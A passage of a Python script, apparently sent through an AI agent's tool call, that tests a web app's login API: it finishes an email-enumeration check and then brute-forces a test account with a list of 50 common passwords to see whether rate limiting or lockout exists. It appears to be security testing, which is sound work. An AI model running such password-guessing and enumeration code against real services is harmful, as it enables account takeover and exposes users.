not_found = [e for e, c, f in enumeration_findings if f == \"NOT FOUND\"]\nif exists and not_found:\n    print()\n    print(\"  *** VULNERABILITY CONFIRMED: Different status codes reveal\")\n    print(\"      whether an email address exists in the system. ***\")\nelif exists:\n    print()\n    print(\"  NOTE: All tested emails returned 200 – endpoint may not distinguish.\")\nelse:\n    print()\n    print(\"  NOTE: No clear enumeration signal detected from status codes alone.\")\n\n# ─────────────────────────────────────────────────────────────────────────────\n# TASK 2: Brute Force / Rate Limiting Test on POST /api/auth/login\n# ─────────────────────────────────────────────────────────────────────────────\nprint()\nprint(\"=\" * 70)\nprint(\"TASK 2: Brute Force / Rate Limiting Test on POST /api/auth/login\")\nprint(\"=\" * 70)\n\nusername = \"jwttest_attacker@test.com\"\npasswords = [\n    \"password1\",\"password2\",\"password3\",\"Password1\",\"Password123\",\n    \"admin\",\"123456\",\"letmein\",\"qwerty\",\"abc123\",\"password\",\"12345678\",\n    \"iloveyou\",\"sunshine\",\"monkey\",\"dragon\",\"master\",\"pass123\",\"test123\",\n    \"welcome\",\"login\",\"user\",\"root\",\"admin123\",\"manager\",\"1234\",\"pass\",\n    \"hello\",\"world\",\"qazwsx\",\"test\",\"password!\",\"P@ssword1\",\"Password1!\",\n    \"wrongpass1\",\"badpass\",\"incorrect\",\"hireflow\",\"hireflow123\",\"hireflow2024\",\n    \"secret\",\"jwt\",\"token\",\"auth\",\"random\",\"guess1\",\"guess2\",\"guess3\",\n    \"wrongpass2\",\"wrongpass3\",\n]\n\nprint(f\"  Target account : {username}\")\nprint(f\"  Total attempts : {len(passwords)}\")\nprint()\n\nrate_limited = []\nlocked_out = []\nsuccess = []\nother_notable = []\n\nfor i, pwd in enumerate(passwords, start=1):\n    try:\n        resp = requests.post(\n            f\"{BASE_URL}/api/auth/login\",\n            json={\"email\": username, \"password\": pwd},\n            timeout=10,\n        )\n        status = resp.status_code\n        body = resp.text[:200].replace(\"\\n\", \" \").strip()\n\n        # Classify interesting responses\n        tag = \"\"\n        if status == 200:\n            tag = \" <-- SUCCESS / LOGGED IN\"\n            success.append((i, pwd, status))\n        elif status == 429:\n            tag = \" <-- RATE LIMITED\"\n            rate_limited.append((i, pwd, status))\n        elif status == 403:\n            tag = \" <-- LOCKED OUT / FORBIDDEN\"\n            locked_out.append((i, pwd, status))\n        elif status not in (400, 401):\n            tag = f\" <-- UNEXPECTED {status}\"\n            other_notable.append((i, pwd, status))\n\n        print(f\"  Attempt {i:02d} | Password: {pwd:<20s} | HTTP_STATUS: {status}{tag}\")\n        print(f\"           Response: {body}\")\n        print()\n\n    except Exception as e:\n        print(f\"  Attempt {i:02d} | Password: {pwd:<20s} | ERROR: {e}\")\n        print()\n\n# ─── Summary ───────────────────────────────────────────────────────────────\nprint(\"-\" * 70)\nprint(\"TASK 2 SUMMARY – Brute Force / Rate Limiting Results:\")\nprint(f\"  Total attempts    : {len(passwords)}\")\nprint(f\"  Rate-limited (429): {len(rate_limited)}\")\nprint(f\"  Locked-out   (403): {len(locked_out)}\")\nprint(f\"  Successful   (200): {len(success)}\")\nprint(f\"  Other notable     : {len(other_notable)}\")\n\nif rate_limited:\n    print()\n    print(\"  Rate-limited attempts:\")\n    for idx, pwd, code in rate_limited:\n        print(f\"    Attempt #{idx} password='{pwd}' -> {code}\")\n\nif locked_out:\n    print()\n    print(\"  Lockout attempts:\")\n    for idx, pwd, code in locked_out:\n        print(f\"    Attempt #{idx} password='{pwd}' -> {code}\")\n\nif success:\n    print()\n    print(\"  *** SUCCESSFUL LOGIN(S) FOUND:\")\n    for idx, pwd, code in success:\n        print(f\"    Attempt #{idx} password='{pwd}' -> {code}\")\n\nif not rate_limited and not locked_out:\n    print()\n    print(\"  *** VULNERABILITY CONFIRMED: No rate limiting or account lockout\")\n    print(\"      detected after 50 consecutive failed login attempts. The\")\n    print(\"      endpoint is susceptible to brute-force attacks. ***\")\nelse:\n    print()\n    print(\"  NOTE: Some form of rate limiting or lockout appears to be active.\")\n\nprint(\"=\" * 70)\nprint(\"Tests complete.\")\n"},"caller":{"type":"direct"}}
